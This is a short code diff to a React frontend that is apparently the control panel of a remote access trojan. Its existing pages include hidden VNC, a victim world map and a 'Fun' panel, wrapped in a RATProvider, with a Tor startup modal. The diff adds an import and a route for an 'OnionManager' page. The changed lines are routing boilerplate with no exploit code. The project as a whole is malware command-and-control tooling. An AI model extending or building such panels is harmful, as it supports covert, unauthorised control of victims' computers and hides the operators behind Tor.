@@ -23,6 +23,7 @@ import { HVNC } from "./pages/HVNC";
 import { WorldMap } from "./pages/WorldMap";
 import { FunPanel } from "./pages/Fun";
 import { InputBox } from "./pages/InputBox";
+import { OnionManager } from "./pages/OnionManager";
 import { TorStartupModal } from "./components/TorStartupModal";
 import { useLocation } from "react-router-dom";
 
@@ -140,6 +141,7 @@ export const App: React.FC = () => {
           <Route path="/logs" element={<Logs />} />
           <Route path="/worldmap" element={<WorldMap />} />
           <Route path="/settings" element={<Settings />} />
+          <Route path="/onion" element={<OnionManager />} />
         </Route>
       </Routes>
     </RATProvider>
